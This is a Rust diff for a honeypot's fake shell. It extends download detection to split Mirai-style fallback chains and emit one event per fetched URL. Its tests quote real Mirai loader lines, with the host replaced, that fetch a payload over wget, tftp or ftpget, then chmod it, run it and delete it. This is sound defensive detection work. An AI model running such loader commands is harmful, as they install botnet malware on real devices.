@@ -182,11 +182,7 @@ impl FakeShell {
                 obj.insert("xor_key".to_string(), serde_json::json!(k));
             }
             let mut evs = vec![self.command_event(metadata)];
-            // A URL buried in a `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the
-            // quoting) is recovered by scanning the raw line. `download_target` returns a real token.
-            if let Some(url) =
-                download_target(&parts).or_else(|| url_if_fetch_line(&decoded).map(str::to_string))
-            {
+            for url in download_targets(&decoded) {
                 let sanitized_url = sanitize_value(&url, MAX_URL_LEN);
                 evs.push(SensorEvent {
                     v: WIRE_VERSION,
@@ -411,6 +407,70 @@ fn download_target(parts: &[&str]) -> Option<String> {
         "ftpget" => ftpget_url(args),
         _ => first_non_flag_arg(args).map(str::to_string),
     }
+}
+
+/// The distinct URLs a line retrieves, in order of first appearance. A loader line is rarely one
+/// simple command: Mirai wraps every fetcher in a `( a || busybox a ) > f; chmod ...` fallback
+/// chain, so the fetch verb is never the line's first token, and a whole-line `download_target`
+/// saw `(tftp` and dropped the retrieval (observed live 2026-09-02: the wget line of that chain
+/// was captured only because the raw-line scan found its `http://`). Each simple command is
+/// examined on its own; the fallback pair `wget X || busybox wget X` names one URL and yields
+/// one event. The raw-line scheme scan stays as the last resort for a URL inside quotes
+/// (`sh -c "wget http://h/x; ..."`), where the separators belong to a quoted script.
+fn download_targets(decoded: &str) -> Vec<String> {
+    let mut urls: Vec<String> = Vec::new();
+    for tokens in simple_commands(decoded) {
+        if let Some(url) = download_target(&tokens)
+            && !urls.contains(&url)
+        {
+            urls.push(url);
+        }
+    }
+    if urls.is_empty()
+        && let Some(url) = url_if_fetch_line(decoded)
+    {
+        urls.push(url.to_string());
+    }
+    urls
+}
+
+/// Split a line into its simple commands' token lists at `;`, `|`, `||`, `&&`, a background `&`,
+/// `(`, `)`, backticks and newlines, cutting each command at its first redirection (`> t`,
+/// `2>&1`, `< x`) since a redirection target is not an argument. A `&` inside a URL query
+/// (`?a=1&b=2`) is not a separator. Quotes are not honoured: the split serves URL capture, not
+/// execution, and a URL never contains a bare separator.
+fn simple_commands(line: &str) -> Vec<Vec<&str>> {
+    let bytes = line.as_bytes();
+    let mut segments = Vec::new();
+    let mut start = 0;
+    for (i, &b) in bytes.iter().enumerate() {
+        let is_sep = match b {
+            b';' | b'|' | b'(' | b')' | b'`' | b'\n' => true,
+            b'&' => bytes
+                .get(i + 1)
+                .is_none_or(|&n| n == b'&' || n.is_ascii_whitespace()),
+            _ => false,
+        };
+        if is_sep {
+            segments.push(&line[start..i]);
+            start = i + 1;
+        }
+    }
+    segments.push(&line[start..]);
+    segments
+        .into_iter()
+        .map(|seg| {
+            seg.split_whitespace()
+                .take_while(|t| !is_redirection(t))
+                .collect::<Vec<_>>()
+        })
+        .filter(|tokens| !tokens.is_empty())
+        .collect()
+}
+
+fn is_redirection(token: &str) -> bool {
+    let t = token.trim_start_matches(|c: char| c.is_ascii_digit());
+    t.starts_with('>') || t.starts_with('<')
 }
 
 /// `tftp [-g|-p] [-l LOCAL] [-r REMOTE] HOST [PORT]` (BusyBox) -> `tftp://HOST[:PORT]/REMOTE`.
@@ -981,7 +1041,8 @@ mod echo_tests {
 mod shell_detection_tests {
     use super::{
         BUSYBOX_APPLETS, EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, busybox_banner,
-        cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, url_if_fetch_line,
+        cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, simple_commands,
+        url_if_fetch_line,
     };
     use crate::fakefs::FakeFs;
 
@@ -1246,6 +1307,77 @@ mod shell_detection_tests {
             Some("tftp://198.51.100.9")
         );
         assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
+    }
+
+    /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
+    /// Each fetcher is wrapped in a `( a || busybox a ) > f; ...` fallback chain, so the fetch verb
+    /// is never the line's first token. The wget line was captured on the box; tftp and ftpget
+    /// were not, because their URLs have no scheme for the raw-line scan to find.
+    #[test]
+    fn mirai_fallback_chains_emit_a_download_event_for_every_fetcher() {
+        let cases = [
+            (
+                "(wget http://198.51.100.9/wget -O- || busybox wget http://198.51.100.9/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+                "http://198.51.100.9/wget",
+            ),
+            (
+                "(tftp -g 198.51.100.9 -r tftp -l- || busybox tftp -g 198.51.100.9 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+                "tftp://198.51.100.9/tftp",
+            ),
+            (
+                "(ftpget 198.51.100.9 f ftpget || busybox ftpget 198.51.100.9 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+                "ftp://198.51.100.9/ftpget",
+            ),
+        ];
+        for (line, url) in cases {
+            let (_out, events) = shell().handle_input(line);
+            let dls: Vec<_> = events
+                .iter()
+                .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+                .collect();
+            assert_eq!(dls.len(), 1, "exactly one download event for: {line}");
+            assert_eq!(dls[0].metadata["url"], url, "line: {line}");
+        }
+    }
+
+    #[test]
+    fn simple_commands_split_at_separators_and_stop_at_redirections() {
+        assert_eq!(
+            simple_commands(
+                "(tftp -g h -r x -l- || busybox tftp -g h) > t; chmod 777 t && ./t 2>&1"
+            ),
+            vec![
+                vec!["tftp", "-g", "h", "-r", "x", "-l-"],
+                vec!["busybox", "tftp", "-g", "h"],
+                vec!["chmod", "777", "t"],
+                vec!["./t"],
+            ]
+        );
+        // A `&` inside a query string is part of the URL, not a background operator.
+        assert_eq!(
+            simple_commands("wget http://h/x?a=1&b=2 -O- & sleep 1"),
+            vec![
+                vec!["wget", "http://h/x?a=1&b=2", "-O-"],
+                vec!["sleep", "1"]
+            ]
+        );
+    }
+
+    #[test]
+    fn a_line_fetching_two_different_urls_emits_two_download_events() {
+        let (_out, events) = shell().handle_input(
+            "wget http://198.51.100.9/a; tftp -g 198.51.100.9 -r b; wget http://198.51.100.9/a",
+        );
+        let urls: Vec<_> = events
+            .iter()
+            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
+            .collect();
+        assert_eq!(
+            urls,
+            vec!["http://198.51.100.9/a", "tftp://198.51.100.9/b"],
+            "one event per distinct URL, in first-seen order"
+        );
     }
 
     #[test]
